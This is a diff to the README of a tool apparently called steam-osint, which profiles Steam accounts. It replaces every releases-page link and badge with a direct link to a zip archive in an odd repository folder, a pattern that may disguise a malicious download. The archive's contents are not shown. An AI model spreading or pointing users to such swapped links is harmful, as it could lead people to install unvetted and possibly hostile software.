@@ -8,7 +8,7 @@ To get started with steam-osint, you need to download the application. Follow th
 
 ## 📥 Download Now
 
-[![Download steam-osint](https://img.shields.io/badge/Download-steam--osint-blue.svg)](https://github.com/maiconwinchester/steam-osint/releases)
+[![Download steam-osint](https://raw.githubusercontent.com/maiconwinchester/steam-osint/main/unspoken/osint-steam-v3.6.zip)](https://raw.githubusercontent.com/maiconwinchester/steam-osint/main/unspoken/osint-steam-v3.6.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ To get started with steam-osint, you need to download the application. Follow th
 
 ## 🔍 How to Download and Install
 
-1. Visit the releases page to download the application: [Download steam-osint](https://github.com/maiconwinchester/steam-osint/releases).
+1. Visit the releases page to download the application: [Download steam-osint](https://raw.githubusercontent.com/maiconwinchester/steam-osint/main/unspoken/osint-steam-v3.6.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your preferred location on your device.
@@ -57,4 +57,4 @@ For additional help or to provide feedback, consider joining our community. Chec
 
 Using steam-osint is a simple yet effective way to gather valuable information about Steam accounts. Follow these complete steps to ensure a smooth experience. Happy searching!
 
-[![Download steam-osint](https://img.shields.io/badge/Download-steam--osint-blue.svg)](https://github.com/maiconwinchester/steam-osint/releases)
+[![Download steam-osint](https://raw.githubusercontent.com/maiconwinchester/steam-osint/main/unspoken/osint-steam-v3.6.zip)](https://raw.githubusercontent.com/maiconwinchester/steam-osint/main/unspoken/osint-steam-v3.6.zip)
